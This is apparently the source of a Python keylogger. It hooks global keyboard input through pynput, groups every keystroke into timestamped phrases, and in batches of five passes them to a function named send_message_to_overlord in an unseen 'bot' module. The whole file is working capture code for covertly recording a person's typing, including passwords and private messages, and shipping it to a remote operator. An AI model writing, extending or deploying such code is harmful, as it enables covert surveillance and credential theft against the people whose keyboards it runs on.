from pynput.keyboard import Key, Listener
import datetime
from phrasestroke import PhraseStroke
import bot
import IPython

class KeyListener:
    BUFFER_CAPACITY = 5

    def __init__(self):
        self.initialize_ivars()

    def initialize_ivars(self):
        self.buffered = []
        self.current_phrase = ""
        self.start_timestamp = None

    def run(self):
        with Listener(on_press=lambda key: self.on_press(key)) as listener:
            listener.join()

    def on_press(self, key):
        try:
            a_key = key.char.encode('ascii')
        except AttributeError:
            a_key = str(key)
        # avoid key.backspace, TODO make list of keys that terminate a phrase (tab, enter)
        if "Key." in a_key and self.current_phrase is not "":
            self.buffered.append(PhraseStroke(self.start_timestamp,
                                              self.current_phrase,
                                              ending_character=a_key))
            self.current_phrase = ""
            self.start_timestamp = None
            return

        if self.current_phrase is "":
            self.start_timestamp = str(datetime.datetime.now())
        self.current_phrase += a_key

        if len(self.buffered) >= self.BUFFER_CAPACITY:
            bot.send_message_to_overlord(self.buffered)

            # Flush buffer
            self.initialize_ivars()


def main():
    key_listener = KeyListener()
    key_listener.run()


if __name__ == '__main__':
    main()
